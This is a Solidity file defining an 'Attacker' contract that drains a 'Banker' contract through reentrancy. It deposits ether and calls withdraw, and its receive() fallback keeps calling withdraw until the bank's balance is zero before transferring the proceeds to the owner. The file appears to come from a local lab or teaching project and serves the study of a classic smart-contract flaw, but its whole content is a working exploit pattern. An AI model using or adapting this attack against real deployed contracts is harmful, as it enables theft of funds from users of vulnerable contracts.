// // SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./Banker.sol";

interface IBanker {
    function deposit() external payable;

    function withdraw() external;
}

contract Attacker {
    IBanker public immutable banker;
    address private owner;

    constructor(address bankerAddress) {
        banker = IBanker(bankerAddress);
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "Attack");
        _;
    }

    function attack() external payable onlyOwner {
        banker.deposit{value: msg.value}();
        banker.withdraw();
    }

    receive() external payable {
        if (address(banker).balance > 0) {
            console.log("attacking again ... ");
            banker.withdraw();
        }
        else {
            console.log("Bank account drained");
            console.log("Actual Attacker Balance: ", address(this).balance);
            payable(owner).transfer(address(this).balance);
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}